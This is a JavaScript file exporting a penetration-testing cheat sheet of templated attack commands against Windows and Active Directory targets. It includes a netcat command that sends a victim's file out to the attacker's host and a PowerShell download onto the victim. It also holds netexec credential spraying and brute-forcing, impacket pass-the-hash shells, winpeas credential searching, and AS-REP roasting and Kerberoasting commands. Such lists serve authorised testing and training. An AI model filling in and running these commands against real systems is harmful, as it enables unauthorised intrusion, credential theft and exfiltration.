export var commands = {
    "gen": {
        "Basic Full TCP Port nmap": "nmap -v -sT -sC -Pn -p- {{RHOST}} -o nmap.txt",
        "Basic UDP Port nmap": "nmap -v -sU -sC -Pn --top-port=20 {{RHOST}} -o nmap_udp.txt",
        "Transfer File to victim (Powershell) ": "iwr http://{{LHOST}}:{{WEBPORT}}/{{LFILE}} -o {{LFILE}}",
        "Download File from victim (Netcat) - CMD ": "nc.exe {{LHOST}} {{LPORT}} -w 3 < {{RFILE}} \nnc -lnvp {{LPORT}} > {{LFILE}}"
    },
    "winenum": {
        "Enumerate using Winpeas": "./winpeas.exe",
        "Search for Credentials using winpeas": "./winpeas.exe credentials",
        "Search for files on the system": "Get-ChildItem -Path C:\\Users\\ -Include * -File -Recurse -ErrorAction SilentlyContinue"
    },
    "winnetexec": {
        "Netexec SMB - single domain credentials": "netexec smb {{RHOST}} -u {{USERNAME}} -p {{PASSWORD}}",
        "Netexec SMB - single domain hash": "netexec smb {{RHOST}} -u {{USERNAME}} -p {{NTLMHASH}}",
        "Netexec SMB - single local credentials": "netexec smb {{RHOST}} -u {{USERNAME}} -H {{PASSWORD}} --local-auth",
        "Netexec SMB - multiple targets, multiple domain credentials": "netexec smb target.txt -U username.txt -P passwords.txt --continue-on-success",
        "Netexec SMB - multiple targets, multiple domain credentials, no bruteforce": "netexec smb target.txt -U username.txt -P passwords.txt --no-bruteforce --continue-on-success",
        "Netexec WINRM - single domain credentials (see netexec SMB for more combination)": "netexec winrm {{RHOST}} -u {{USERNAME}} -p {{PASSWORD}}",
        "Netexec RDP - single domain credentials (see netexec SMB for more combination)": "netexec rdp {{RHOST}} -u {{USERNAME}} -p {{PASSWORD}}",
        "Netexec MSSQL - single domain credentials (see netexec SMB for more combination)": "netexec mssql {{RHOST}} -u {{USERNAME}} -p {{PASSWORD}}",
    },
    "wincon": {
        "Psexec Connection with password for domain": "impacket-psexec {{DOMAIN}}/{{USERNAME}}:\"{{PASSWORD}}\"@{{RHOST}}",
        "Psexec Connection with password for local": "impacket-psexec {{USERNAME}}:\"{{PASSWORD}}\"@{{RHOST}}",
        "Psexec Connection with pass the hash": "impacket-psexec -hashes 00000000000000000000000000000000:{{NTLMHASH}} {{USERNAME}}@{{RHOST}}",
        "Wmiexec Connection with pass the hash": "impacket-wmiexec -hashes :{{NTLMHASH}} {{USERNAME}}@{{RHOST}}"
    },
    "adattack": {
        "AS-REP Roasting (ASREP)": "impacket-GetNPUsers -dc-ip {{DCIP}}  -request -outputfile hashes.asreproast {{DOMAIN}}/{{USERNAME}}",
        "Kerberoasting (Kerberos)": "impacket-GetUserSPNs -request -dc-ip {{DCIP}} {{DOMAIN}}/{{USERNAME}}",
        "DSYNC Attack": ""
    }

}
